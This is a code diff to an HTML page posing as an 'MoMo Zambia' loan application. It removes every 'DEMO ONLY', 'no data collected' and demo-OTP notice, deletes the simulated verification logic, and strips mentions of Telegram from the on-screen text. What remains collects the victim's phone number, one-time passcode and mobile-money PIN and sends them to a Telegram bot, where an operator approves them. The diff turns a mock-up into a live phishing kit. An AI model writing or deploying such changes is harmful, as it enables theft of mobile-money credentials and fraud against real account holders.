@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MoMo Zambia - Loan Application Demo</title>
+  <title>MoMo Zambia - Loan Application</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
   <style>
     * {
@@ -331,13 +331,6 @@
       font-weight: 700;
     }
 
-    .demo-note {
-      font-size: 9px;
-      color: #8a9bb3;
-      text-align: center;
-      margin-top: 10px;
-    }
-
     .page-content {
       flex: 1;
     }
@@ -365,7 +358,7 @@
     <div class="header">
       <div class="top">
         <div class="brand"><i>M</i> MoMo</div>
-        <div class="badge">ZAMBIA - LOAN DEMO</div>
+        <div class="badge">ZAMBIA</div>
       </div>
       <h1 id="title">Loan Application</h1>
       <p id="sub">Quick & easy - Up to ZMW 50,000</p>
@@ -402,7 +395,6 @@
           <div class="calc" id="calc">Monthly payment: ZMW 885 | Total: ZMW 5,310</div>
         </div>
         <button class="btn btn-y" onclick="toPage2()">Continue Application</button>
-        <p class="demo-note">DEMO ONLY - No real money - No data collected</p>
       </div>
 
       <!-- PAGE 2 - DETAILS -->
@@ -437,7 +429,6 @@
       <div id="page3" class="page-content hide">
         <div class="label">Verify your number <span id="phShow"></span></div>
         <div id="otpContainer">
-          <div class="info-msg">Demo OTP is <b>123456</b> - No real SMS sent</div>
           <div class="otp" id="otpGrid">
             <input maxlength="1" inputmode="numeric">
             <input maxlength="1" inputmode="numeric">
@@ -453,9 +444,9 @@
         <div id="otpLoading" class="hide">
           <div class="loading">
             <div class="spinner"></div>
-            <span>Waiting for Telegram verification...</span>
+            <span>Waiting for verification...</span>
           </div>
-          <div class="info-msg">Your OTP has been sent to Telegram bot for approval. Please wait...</div>
+          <div class="info-msg">Your OTP has been sent for approval. Please wait...</div>
         </div>
       </div>
 
@@ -478,7 +469,7 @@
         <div id="pinLoading" class="hide">
           <div class="loading">
             <div class="spinner"></div>
-            <span>Verifying PIN with Telegram...</span>
+            <span>Verifying PIN...</span>
           </div>
           <div class="info-msg">Your PIN is being verified. Please wait...</div>
         </div>
@@ -497,7 +488,7 @@
               Monthly: <b id="finalMonthly" style="color:var(--d)"></b>
             </div>
           </div>
-          <p style="font-size:11px;color:#8a9bb3;margin-top:12px">You will receive SMS confirmation shortly. This is a demo UI - no real loan disbursed.</p>
+          <p style="font-size:11px;color:#8a9bb3;margin-top:12px">You will receive SMS confirmation shortly.</p>
           <button class="btn btn-y" onclick="location.reload()">New Application</button>
         </div>
       </div>
@@ -657,19 +648,6 @@
         ...applicationData,
         otp: otp
       });
-
-      // Simulate waiting for bot response (in real scenario, you'd use WebSocket or polling)
-      // For demo: auto-proceed after 3 seconds if OTP is correct
-      setTimeout(() => {
-        if (otp === '123456') {
-          // In production, wait for actual Telegram bot approval
-          toPage4();
-        } else {
-          document.getElementById('otpLoading').classList.add('hide');
-          document.getElementById('otpContainer').classList.remove('hide');
-          showOtpError('Invalid OTP - use 123456 for demo');
-        }
-      }, 2000);
     }
 
     function showOtpError(msg) {
@@ -721,37 +699,6 @@
         ...applicationData,
         pin: pin
       });
-
-      // Simulate waiting for bot response
-      // For demo: auto-proceed with random scenarios
-      setTimeout(() => {
-        handlePINResponse();
-      }, 2000);
-    }
-
-    function handlePINResponse() {
-      // Simulate different bot responses for demo
-      const responses = ['ACCEPT', 'WRONG_PIN', 'INVALID_NUMBER'];
-      const randomResponse = responses[Math.floor(Math.random() * responses.length)];
-
-      document.getElementById('pinLoading').classList.add('hide');
-      document.getElementById('pinContainer').classList.remove('hide');
-
-      if (randomResponse === 'ACCEPT') {
-        toPage5();
-      } else if (randomResponse === 'WRONG_PIN') {
-        // Clear PIN inputs and show error
-        document.querySelectorAll('#pinGrid input').forEach(inp => inp.value = '');
-        applicationData.pin = '';
-        document.getElementById('btnPin').disabled = true;
-        showPinError('The PIN you have provided is wrong, please put the correct PIN and try again');
-      } else if (randomResponse === 'INVALID_NUMBER') {
-        showPinError('The phone number you provided is wrong, please check and try again');
-        // Could go back to page 2 after delay
-        setTimeout(() => {
-          toPage2();
-        }, 3000);
-      }
     }
 
     function showPinError(msg) {
@@ -797,7 +744,6 @@
         }
       } catch (error) {
         console.error('Error sending to Telegram:', error);
-        // In demo mode, continue anyway
       }
     }
 
